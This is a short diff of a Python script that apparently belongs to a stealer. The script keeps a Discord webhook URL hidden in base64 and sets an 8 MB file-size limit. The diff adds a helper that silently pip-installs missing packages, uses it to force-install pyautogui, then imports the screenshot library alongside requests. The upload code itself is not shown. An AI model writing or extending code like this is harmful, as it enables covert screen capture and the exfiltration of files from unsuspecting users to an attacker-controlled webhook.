@@ -8,6 +8,28 @@ FILE_WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDI1MzU1MDIx
 
 MAX_FILE_SIZE = 8 * 1024 * 1024
 
+
+def ensure_package(package_name, import_name):
+    """
+    Ensure a Python package is installed.
+    
+    :param package_name: Name used by pip (e.g. 'pywin32')
+    :param import_name: Module to test import (e.g. 'win32com.client')
+    """
+    try:
+        importlib.import_module(import_name)
+    except ImportError:
+        subprocess.check_call([
+            sys.executable,
+            "-m",
+            "pip",
+            "install",
+            "--upgrade",
+            package_name,
+        ])
+
+ensure_package("pyautogui", "pyautogui")
+
 try:
     import pyautogui
     import requests
